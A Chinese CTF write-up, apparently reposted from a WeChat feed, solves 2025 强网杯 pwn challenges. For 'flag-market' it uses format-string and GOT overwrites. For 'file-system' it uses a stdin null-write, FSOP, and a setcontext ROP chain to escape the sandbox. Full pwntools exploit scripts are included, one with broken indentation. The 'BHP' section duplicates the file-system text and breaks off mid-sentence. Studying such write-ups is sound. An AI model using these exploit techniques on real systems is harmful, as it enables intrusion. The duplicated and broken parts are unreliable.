---
title: 2025 强网杯和强网拟态部分题解
url: https://mp.weixin.qq.com/s/2j4Ze2vDhsZY3MGpBmGdRA
source: Doonsec's feed
date: 2026-03-21
fetch_date: 2026-03-22T04:15:58.435060
---

# 2025 强网杯和强网拟态部分题解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ghzzib4axFFgFhricMnBPWygicy7WIJD2Hkhv6rjpxMfdMy5sCWLfv5icLhcSgtzic4blCVUYibj9hTNXQ/0?wx_fmt=jpeg)

# 2025 强网杯和强网拟态部分题解

zer00ne
zer00ne

看雪学苑

![]()

在小说阅读器中沉浸阅读

**1**

**强网杯**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsNic0YuwHUJpibB29WBY3aGiaYZJy5EvhF5YEEONulB5ia4MsmC6g6kJHug/640?wx_fmt=png&from=appmsg)

#

## flag-market

##

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsYE9iaKV9GOsQm7BibbBRopBPoQXiclFHgZS4ib4JHjSr3GKT0FVqkphricw/640?wx_fmt=other&from=appmsg)

程序先是打开了/flag文件

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsMyzdUYicYvSial7GPZs2rGsl9dfuEbwxIUt4ZENmLXZNXUe3Jibs1qJyw/640?wx_fmt=other&from=appmsg)

只有输入金额为0xff时才能进入下面的逻辑,否则关闭`flag`并清空`token`变量

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsqWibsoGdtPHk7ER4j0SmQ9FFicK84snQqQxQfDktFnH7h5TOOwibPSz3g/640?wx_fmt=other&from=appmsg)

随后将flag的头打印出来,将内存中的flag清空,并允许我们向user.log写入内容

由于使用了scanf("%s"),导致可以写入无限长内容

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsL4oicCdhWtnvzO6HQ3tOiaMXpicgLoCPJEHmFFq3bGNQGdzgkaeQN23lA/640?wx_fmt=other&from=appmsg)

当输入长度超过0x100,便可以覆盖format

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsbWicmlibsN1UeDibiarjKs470YfgcbFJCZu15wEmA5fa2HYTvVEnuLc1ZQ/640?wx_fmt=other&from=appmsg)

可以自由格式化字符串,但由于是data段的格式化字符串

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcs56ickib9bMIEm7UMN8k0icBgvFoL2sjZQSxdiaMKK68iauFzDRkQjGwqkfw/640?wx_fmt=other&from=appmsg)

但这里可以输入0x10字节,所以可以将got表写在栈上,但是由于token清空我们无法再次进入scanf("%s")

如果我们将exit的got表改写为main函数,在退出时便可以再次进入main中,token便会刷新,我们又可以控制格式化字符串参数

然后可以使用格式化字符串泄露堆地址

由于flag是文件,所以被串在\_IO\_list\_all的链表中,位于堆上,其中的文件指针中包含flag的内容,只要稍微调试便可以找到flag字符串相对于堆地址的偏移

再次使用exit退出,最后一次格式化字符串将flag的地址写在栈上并使用%s参数泄露flag内容,便可以获得flag

```
from pwn import *
#io=process('./pwn')
context.log_level='debug'
io=remote("47.93.216.175",38936)
def bug():
    gdb.attach(io,"b *0x4014bc")
io.sendlineafter(b"2.exit",b"1")
io.sendlineafter(b"how much you want to pay?",b"255")
io.recvuntil(b"opened user.log, please report:\n")
payload=f"%{0x40}c%13$hhn%{0x13c3-0x40}c%12$hn".encode()#0x4013C3
io.sendline(b'a'*0x100+payload)
io.sendline(b"1")
got=0x404090
io.send(p64(got)+p64(got+2))
io.sendlineafter(b"2.exit",b"2")
io.sendlineafter(b"2.exit",b"2")
io.sendlineafter(b"2.exit",b"1")
io.sendlineafter(b"how much you want to pay?",b"255")
io.recvuntil(b"opened user.log, please report:\n")
io.sendline(b'a'*0x100+b"%11$p")
io.sendlineafter(b"2.exit",b"1")
#io.recvuntil(b"how much you want to pay?\n")
io.recvuntil(b"want to pay?\n")
io.sendline(b"1")
heap=int(io.recvuntil(b"we")[:-2],16)
print(hex(heap))
io.sendlineafter(b"2.exit",b"2")
io.sendlineafter(b"2.exit",b"2")
io.sendlineafter(b"2.exit",b"1")
io.sendlineafter(b"how much you want to pay?",b"255")
io.recvuntil(b"opened user.log, please report:\n")
io.sendline(b'a'*0x100+b"%16$s")
io.sendlineafter(b"2.exit",b"1")
io.send(p64(heap+0x3c0)+p64(heap+0x3c0))
io.interactive()
```

## file-system

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsKWicDX1dDHqlj6BnB6EiapH4EibQw5yAo7hLiaXLHngJjZKGnTF30Tzx1g/640?wx_fmt=other&from=appmsg)

在leak中,可以输入0x28字节数据,泄露libc地址

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsVtOLMsuZrGC7Tu2bFOrF9bfDCtqKvlVtA1trsTRE4TE1D1mL7ln78w/640?wx_fmt=other&from=appmsg)

随后进入一个堆管理菜单

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsYo6OjsVSaafMow1RwgtM5XX4GLWBEiaT6Ws7ODaAssMsE4wDjdfQAfA/640?wx_fmt=other&from=appmsg)

其中edit,show,free都没有什么用

add功能只能使用一次,但是没有限制申请堆块的大小

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsiaFhxeUmd2jicLpImTeiawGPtwtgAzLtzxeIFkWUicxZicLNzrvFmibfqvAQ/640?wx_fmt=other&from=appmsg)

这里的问题是没有对malloc大小进行检查,边直接进行read与ptr+size-1的置零

当malloc大小过大会malloc失败并返回null

所以当我们申请addr+1大小(足够大),便可以实现对任意addr的null写

由于我们已经知道了libc地址,便可以实现对任意libc地址的null写

libc的攻击面(got表,IO结构体,IO\_list\_all)

其中2.39中got已经不可写了,使用null攻击IO\_list\_all远远不够

如果攻击stdout结构体,最多只能泄露,但是我们已经有了libc地址

所以只剩下stdin可以攻击

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcst7srmKRYvPW8cwe1CoibZWU4OrhicJPrmRPbkH8OicznfgxyJ8mTmc6HQ/640?wx_fmt=other&from=appmsg)

在写入null时,stdin结构体的read\_base为0x74ee68c03963,read\_ptr为0x74ee68c03964

如果在read\_base的末尾置0,下次走IO的输入函数便可以复写stdin结构体中read的三枚指针,可以在libc中任意长度写。

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcs8vtv9MpwkwxysEWSxiboejvib14SAkKzaMticVUXoCcbYwmmnO9ymumjQ/640?wx_fmt=other&from=appmsg)

```
from pwn import *
io=process('./pwn')
libc=ELF('./libc.so.6')
#io=remote("123.56.27.220",26633)
def bug():
    gdb.attach(io)
def add(size):
io.sendlineafter(b"Choice: ",b"1")
io.sendlineafter(b"Size: ",str(size).encode())
io.send(b'a'*0x28)
io.recvuntil(b'a'*0x28)
base=u64(io.recv(6)+b'\x00\x00')-0xaddae
print(hex(base))
stdin=base+0x2038e0
add(stdin+0x38+1)
IO=base+libc.sym._IO_2_1_stdout_
io.send(p64(0)*3+p64(IO)+p64(IO+0xa000))
```

由于开启了沙箱,使用orw绕过沙箱即可

直接在IO结构体中FSOP,使用setcontext进行栈迁移即可执行ROP

```
from pwn import *
io=process('./pwn')
libc=ELF('./libc.so.6')
#io=remote("123.56.27.220",26633)
def bug():
    gdb.attach(io)
def add(size):
    io.sendlineafter(b"Choice: ",b"1")
    io.sendlineafter(b"Size: ",str(size).encode())
io.send(b'a'*0x28)
io.recvuntil(b'a'*0x28)
base=u64(io.recv(6)+b'\x00\x00')-0xaddae
print(hex(base))
stdin=base+0x2038e0
add(stdin+0x38+1)
IO=base+libc.sym._IO_2_1_stdout_
io.send(p64(0)*3+p64(IO)+p64(IO+0xa000))
rdi=base+0x000000000010f78b
rsi=base+0x0000000000110a7d
rdx=base+0x0000000000138d05#movsxd rdx, ecx ; ret
rcx=base+0x00000000000a877e
jmp_gadget=base+0x00000000000ee303
openat=base+libc.sym.openat
read=base+libc.sym.read
write=base+libc.sym.write
#------------------------------------------------
rop=p64(rdi)+p64(0x10000000000000000-100)
rop+=p64(rsi)+p64(IO + 0xe8)
rop+=p64(rcx)+p64(0)+p64(rdx)
rop+=p64(rcx)+p64(0)
rop+=p64(openat)
rop+=p64(rdi)+p64(3)
rop+=p64(rsi)+p64(IO+0xe0)
rop+=p64(rcx)+p64(0x50)+p64(rdx)
rop+=p64(read)
rop+=p64(rdi)+p64(1)
rop+=p64(rsi)+p64(IO+0xe0)
rop+=p64(rcx)+p64(0x50)+p64(rdx)
rop+=p64(write)
#--------------------------------------------------
fake_file = flat({
        0x0:  p64(0x320),
        0x10: p64(base+libc.sym.setcontext + 61),
        0x20: p64(IO),
        0x78: p64(jmp_gadget),
        0x88: p64(base+libc.sym._environ-0x10),  # _lock_chain
        0xa0: p64(IO),
        0xa8: p64(jmp_gadget),
        0xd8: p64(base+libc.sym._IO_wfile_jumps + 0x10),
        0xe0: p64(IO-8)
}, filler=b"\x00")
fake_file+=b"./flag".ljust(0x10,b'\x00')
fake_file+=rop
io.sendafter("Choice:", fake_file)
io.interactive()
```

## BHP

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsx2mzibTV9iaZeBQDmqoE5axzI1ibazlo8f5qgcMpELO8pkqZTzGDL7LPQ/640?wx_fmt=other&from=appmsg)

在leak中,可以输入0x28字节数据,泄露libc地址

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcs1ojtkf7FiaiaZHVNpZpUdNIWjiayicjS4r3iaEaB1YMVvYibETDqfI9nwe8w/640?wx_fmt=other&from=appmsg)

随后进入一个堆管理菜单

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcs47QhwnC6xOBLiaXIMjU1LY2JUQUpSrTwLhsSu9e7H2ic08Glt7H1SMrA/640?wx_fmt=other&from=appmsg)

其中edit,show,free都没有什么用

add功能只能使用一次,但是没有限制申请堆块的大小

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsqDI37Via0FMZeTrYzxARYH5Fa7c2hFTrvZzAyYghOXurkGO9SaHJiaMQ/640?wx_fmt=other&from=appmsg)

这里的问题是没有对malloc大小进行检查,边直接进行read与ptr+size-1的置零

当malloc大小过大会malloc失败并返回null

所以当我们申请addr+1大小(足够大),便可以实现对任意addr的null写

由于我们已经知道了libc地址,便可以实现对任意libc地址的null写

libc的攻击面(got表,IO结构体,IO\_list\_all)

其中2.39中got已经不可写了,使用null攻击IO\_list\_all远远不够

如果攻击stdout结构体,最多只能泄露,但是我们已经有了libc地址

所以只剩下stdin可以攻击

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Ho6BRLSEquc2xXMGvnFBcsIrNR4JuSq0k28sNJsdtyoJm31xYib32oSBKQ2xJtAvicfCTsnVJHz2Mg/640?wx_fmt=other&from=appmsg)

在写入null时,stdin结构体的read\_base为0x74ee68c03963,read\_ptr为0x74ee68c...